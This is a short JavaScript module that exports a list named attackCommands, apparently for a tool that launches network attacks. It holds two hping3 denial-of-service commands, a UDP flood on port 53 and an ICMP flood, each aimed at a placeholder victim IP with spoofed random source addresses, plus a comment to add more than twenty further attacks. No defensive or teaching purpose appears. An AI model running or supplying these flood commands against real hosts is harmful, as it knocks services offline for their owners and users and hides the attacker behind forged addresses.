export const attackCommands = [
  {
    key: "udpFlood",
    command: "hping3 --udp <victim_IP> -p 53 --flood --rand-source"
  },
  {
    key: "icmpFlood",
    command: "hping3 -1 <victim_IP> --flood --rand-source"
  },
  // Add all 20+ attacks here
];
